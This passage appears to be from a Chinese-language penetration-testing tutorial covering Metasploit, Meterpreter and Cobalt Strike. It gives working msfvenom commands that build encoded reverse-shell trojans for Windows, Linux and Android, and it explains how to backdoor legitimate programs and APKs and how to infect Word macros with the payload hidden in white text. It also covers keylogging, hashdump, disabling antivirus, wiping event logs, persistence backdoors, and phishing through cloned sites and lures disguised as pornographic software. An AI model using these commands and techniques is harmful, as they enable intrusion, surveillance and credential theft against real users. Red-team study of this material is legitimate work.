  |   /admin/view/javascript/fckeditor/editor/filemanager/connectors/test.html: OpenCart/FCKeditor File upload
  |   /admin/includes/FCKeditor/editor/filemanager/upload/test.html: ASP Simple Blog / FCKeditor File Upload
  |   /admin/jscript/upload.html: Lizard Cart/Remote File upload
  |_  /webdav/: Potentially interesting folder
  MAC Address: 00:0C:29:3B:4C:26 (VMware)
  
  Host script results:
  |_smb-vuln-ms10-054: false
  |_smb-vuln-ms10-061: false
  |_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug)
  
  Nmap done: 1 IP address (1 host up) scanned in 329.63 seconds
  ~~~

接下来就是对漏洞进行相应利用，量太多，不做赘述

### 五、Meterpreter

Meterpreter是Metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道

使用它作为攻击载荷能够获得目标系统的一个Meterpretershell的链接。Meterpreter shell作为渗透模块有很多有用的功能，比如添加一个用户、隐藏一些东西、打开shell、得到用户密码、上传下载远程主机的文件、运行cmd.exe、捕捉屏幕、得到远程控制权、捕捉按键信息、清楚应用程序、显示、远程主机的系统信息、显示远程机器的网络接口和IP地址等信息。

#### Meterpreter常用命令

* **background：**简写为bg，返回，把meterpreter后台挂起

* **sessions：**查看当前建立的会话

  * `session -i [对应id]`可以回到对应的后台进程
  * `session -k [对应id]`结束进程（-K结束全部进程）

* **quit**：退出会话

* **ps**：查看进程

* **getpid**：查看当前进程号

* **sysinfo**：查看系统信息

* **getsystem**：自动提权

* **shutdown**：关机

* **reboot**：重启

* **netstat**：查看网络连接情况

* **getuid**：查看当前权限

* **访问文件系统**：cd、cat、rm、edit（与linux命令差不多）

* **screenshot**：屏幕截图

* **键盘记录**：keyscan_start、keyscan_dump、keyscan_stop

* **migrate**：migrate [其他进程id]，将meterpreter进程迁移到其他进程，例如系统进程，实现会话的稳定

  也可与keyscan配合使用，例如：将进程迁移至winlogon.exe，再keyscan_start，即可监听登录输入内容

* **shell**：进入目标shell界面，用exit退出

* **arp**：列出目标系统的 ARP 缓存表，其中包括 IP 地址、MAC 地址以及接口信息

* **idletime**： 目标服务器空闲时间，用于判断是否有人正在使用

* **clearev**：清除事件日志

* **run / bgrun**：运行meterpreter的脚本，bgrun是后台运行

  * **run post/windows/gather/enum_applications**：查看目标主机安装了哪些应用
  * **run vnc**：屏幕监控
  * **run killav**：杀死杀毒软件
  * **run post/windows/gather/enum_computers**：用于枚举域内所有用户
  * **run persistence**：我们知道Meterpreter的强大之处之一在于它运行于内存中，不易被杀毒软件发现，但只要目标机环境合适，或你对自己的免杀足够自信，可通过该命令写入硬盘，下次目标机启动时，木马将会自启动
  * **run scraper **：获取目标主机的详细信息（获取到的文件保存在`~/.msf4/logs/scripts/scraper/`路径下）
  * **run post/multi/gather/wlan_geolocate**：基于wlan进行地理位置确认，最终loot文件夹在`/root/.msf4/loot`，如果通过该模块获得了地理信息，会在该文件夹下生成txt文件。注意下路径重点msf4，保不准明天就变成msf5了，是隐藏文件，看文件夹记得勾隐藏文件，命令行查看记得加-a
  * **run hashdump**：获取目标系统用户密码hash，该脚本需要系统用户system权限
  * **run service_manager**：目标系统服务管理，它还有属于自己的参数，一般用于信息收集常会用到`-l`参数
  * **run post/windows/wlan/wlan_profile**：用于读取目标主机WiFi密码
  * **run sound_recorder**：声音记录
  * **run webcam**：开启摄像头

#### 权限维持-生成持续性后门

因为 meterpreter 是基于内存DLL建立的连接，所以，只要目标主机关机，我们的连接就会断。我们又不能每次想连接的时候，每次都去攻击，然后再利用 meterpreter 建立连接。所以，我们得在目标主机系统内留下一个持续性的后门，只要目标主机开机了，我们就可以连接到该主机

##### Persistence后门-写入注册表

可以再msfconsole中使用`exploit/windows/local/persistence`模块：

* 设置session
* 设置startup（尽量选高权限如system）
* run

有点小麻烦，可以直接在meterpreter中创建persistence后门：

~~~shell
run persistence -S -U -X -i 5 -p 8888 -r 192.168.111.132
~~~

其中persistence的选项如下：

~~~shell
-A 自动启动一个匹配的漏洞/多/处理程序来连接到代理
-L如果不使用%TEMP%，则选择目标主机中写入有效负载的>位置。
-P 有效载荷使用，默认是windows/meterpreter/reverse_tcp。
-S在启动时自动启动代理作为服务(具有系统特权)
-T 选择要使用的可执行模板
-U用户登录时自动启动代理
-X在系统启动时自动启动代理
-h这个帮助菜单
-i每次连接尝试之间的间隔(以秒为单位)
-p 运行Metasploit的系统正在监听的端口
-r 运行Metasploit的系统的IP监听连接返回
~~~

写入之后用`multi/handler`模块设置监听即可

### 六、客户端渗透（钓鱼）

#### 客户端渗透原理

在我们在无法突破对方的网络边界的时候，往往需要使用客户端渗透这种方式对目标发起攻击，比如我们向目标发一个含有后门的程序，或者是一个word文档、pdf文件。

客户端渗透技巧，通常用户的计算机都安装了安全软件，一般我们生成的恶意程序都会被检测，所以我们所设计的恶意软件可以利用人的劣根性，比如我们将恶意软件或网站伪装成H色软件或网站，这样目标会认为他本身就是不好的软件被安全软件检测是很正常的事情，如果他安耐不住关闭安全防护软件执意要运行恶意程序，那么他就中招了

#### 制作Windows恶意软件

##### 基础

msfvenom是msfpayload,msfencode的结合体，可利用msfvenom生成木马程序,并在目标机上执行，在本地监听上线：

~~~shell
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.111.132 LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -i 10 -f exe - o /var/www/html/vip.exe
# 这里是msf5，如果是msf6应该为windows/meterpreter_reverse_tcp
~~~

简单分析一下选项：

* -a windows位数
* --platform 操作系统
* -p payload
* -b 去除坏字符 \x00
* -e 指定编码器（本意用于免杀，但效果不太行了）
* -i 编码次数
* -f 生成程序类型
* -o 生成位置

可以尝试两种编码减少杀软识别率：

~~~shell
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.111.132 LPORT=4444 -b "\x00" -e x86/shikata_ga_nai -i 20 | msfvenom -a x86 --platform windows -e x86/alpha_upper -i 10 -f exe - o /var/www/html/vip.exe
~~~

##### 给应用软件加上后门

避免影响原程序运行，可以不给主程序上后门，将马子绑定到关联运行的程序即可

~~~shell
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.111.132 LPORT=4444 -b"\x00" -e x86/shikata_ga_nai -i 10 -x QvodTerminal.exe -f exe -o /var/www/html/QvodTerminal.exe
~~~

* -x 以某程序为模板

#### 制作Linux恶意软件

同理，换了个平台而已：

~~~shell
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=192.168.111.132 LPORT=7890 -f elf > mshell.elf
~~~

#### 利用宏感染word文档

前提是用户的office开启了宏

生成宏和payload：

~~~shell
msfvenom -a x86 --platform windows -p
windows/meterpreter/reverse_tcp LHOST=192.168.60.128
LPORT=4444 -e x86/shikata_ga_nai -i 10 -f vba-exe
~~~

将生成的宏代码粘贴到word的宏里面，保存为启用宏的文档

将生成的payload放到文档内容中，字体调成白色进行隐藏

### 七、MSF注入Android

#### MSF生成Android apk

~~~shell
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.111.132 LPORT=4444 R > /var/www/html/msf.apk
~~~

同样multi/handler监听

#### 520_APK_HOOK

我们给已有应用软件加后门（应用apk可以在豌豆荚上下载）：

~~~shell
msfvenom -x 应用.apk --platform android -p android/meterpreter/reverse_tcp LHOST=192.168.111.132 LPORT=4444 -o msftest.apk
~~~

这里通常会报错说apktool过旧，重新配置又略显麻烦，所以可以使用一款工具：**520_APK_HOOK**

* 相比于普通的安卓远控，此版本app在进行远控时，被注入的app可以正常运行

* 注入后的app在安装时，手机管家不会有任何安全提示，普通的远控程序，安装时手机管家会有安全警示

* 理论上来说，只要远控软件使用的是纯Java或者Kotlin编写，就可以使用，不一定必须是msf生成的apk

~~~shell
java -jar a520ApkHook-1.0-jar-with-dependencies.jar -o ~/Downloads/想进行注入的App.apk ~/Downloads/msf.apk
#msf.apk就是msf生成的后门apk，注入成功后会生成520apkhook.apk
~~~

更多使用细节见项目地址: https://github.com/ba0gu0/520apkhook

#### 常用的Android指令 

getshell后一些常用指令：

* check_root 检查设备是否为root

* dump_calllog 获得通话记录

* dump_contacts 获得通讯录

* dump_sms 获得短信

* geolocate 获取定位信息

* send_sms 发送一条短信

* wlan_geolocate 通过wlan信息获得定位信息

* app_install 安装app

* app_list 列出当前设备上已安装的包名

* app_run 通过包名启动Android应用

* app_uninstall 卸载一个app

## CoBalt Strike（CS）

CobaltStrike是一款美国RedTeam开发的渗透测试神器，常被业界人称为CS。它是一款以Metasploit为基础的**GUI的框架式渗透工具**，集成了端口转发、服务扫描、自动化溢出、多模式端口监听、Winexe木马生成、Windll木马生成、Java木马生成、office宏病毒生成、木马捆绑等；钓鱼攻击包括：站点克隆、目标信息获取、Java执行、浏览器自动攻击等

官方地址：https://www.cobaltstrike.com

### 一、CS介绍

CobaltStrike分为服务端和客户端

服务端可以部署在远程服务器下或者部署在kaili里

客户端可以部署到本地支持linux和windows系统

CS的一大特色是支持多人运动🥵，集体上线分工合作：

![image-20240712173424554](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240712173425818-350657935.png)

### 二、CS服务器与客户端

#### 服务端启动

服务端尽量部署在linux中

打开root终端进入CS目录

在终端中输入：./teamserverIP密码

#### 客户端连接

Cobaltstrike客户端在Windows、Linux、Mac下都可以运行 (需要配置好Java环境)。

启动CobaltStrike客户端，输入服务端的IP以及端口、连接密码，用户名可以任意设置

### 三、CS基本功能简介

界面的图标：

![image-20240712181206636](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240712181207647-2071184489.png)

其他功能选项的都有文字，不做赘述

#### 监听器

Cobaltstrike提供了多种监听器

beacon_xx系列为CobaltStrike自身内置的监听器，即在目标主机执行相应的payload，获取shell到CS上，包括dns、http、https、smb、tcp等方式的监听器；

foreign系列为外部监听器，通常与MSF联动，例如获取meterpreter到MSF上

#### beacon常用命令

右键上线的主机，点击interact进入beacon命令行

* 记得调整一下心跳间隔：

  ~~~shell
  sleep 3
  #打靶机直接sleep 0即可，实战不建议过快，流量会异常
  ~~~

* 执行系统命令：

  ~~~shell
  shell [系统命令]
  ~~~

* beacon自身命令：

  命令很多，可以用help查看详细解释，很多命令基本都可以依靠图形化界面完成

#### 信息收集

功能点位于`Attacks -> web Drive-by -> System Profiler`

原理就是挂了个系统代理，然后我们访问目标网站，CS进行被动扫描，个人觉得不如用其他专门的漏扫器

#### 网站克隆

这是一个挺有趣的功能，可以用于简单的社工、钓鱼

功能点位于`Attacks -> web Drive-by -> Clone Site`

似乎只能克隆http

比如克隆百度，我们就这样（这里可以把最下面的键盘记录勾上）：

![image-20240713133405706](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240713133406767-388516571.png)

可以看见直接就克隆了，非常完美：

![image-20240713133444995](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240713133445738-278723846.png)

接下来将ip拿去生成一个短链接，就比较具有迷惑性了

在搜索框输入Yuy0ung，也能成功记录：

![image-20240713135555907](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240713135557203-592717146.png)

#### 钓鱼邮件

功能点位于`Attacks -> Spear Phish `

![image-20240713150225935](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240713150226875-854603629.png)

如图：该模块有6个需要自定义的内容：

* 目标
* 模板
* 附件
* 嵌入URL
* 邮件服务器
* 退信通知邮箱

## MSF&CS联动

### 一、Cobalt Strike传递会话到MSF

我们当前使用CS获得了一个过了uac的win7的shell

![image-20240713162540965](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240713162541791-1810815189.png)

接下来将会话派生到msf：

* 首先在CS上用`exploit/multi/handler`的`windows/meterpreter/reverse_http`开启监听:

  ![image-20240713165625978](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240713165627136-1691240848.png)

* 接下来在CS上新建一个payload为foreign HTTP的监听器：

  设置好IP和端口即可创建：

  ![image-20240713162416728](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240713162418087-1028961126.png)

* 右键CS上的主机，点击spawn，选择我们创建的监听器即可派生会话：

  ![image-20240713165914807](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240713165915584-1280715270.png)

### 二、MSF传递会话到Cobalt Strike

我们当前使用MSF打永恒之蓝获得了一个win7的shell：

![image-20240713171044608](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240713171046719-1039297378.png)

接下来派生会话到CS：

* CS创建一个payload为Beacon HTTP的监听器：

  ![image-20240713172743463](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240713172744533-1301657088.png)

* background返回到console选择模块并设置参数：

  ~~~shell
  use exploit/windows/local/payload_inject
  
  set payload windows/meterpreter/reverse_http
  
  set lhost 192.168.111.132 # CS服务端IP
  
  set lport 8888 # CS服务端监听的端口号
  
  set DisablePayloadHandler True
  
  set PrependMigrate True
  
  set session 1 # 会话id
  
  run
  ~~~

  ![image-20240713172947333](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240713172948247-393759592.png)

* 执行之后即可派生会话至CS：

  ![image-20240713173703705](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240713173704560-194066205.png)

  
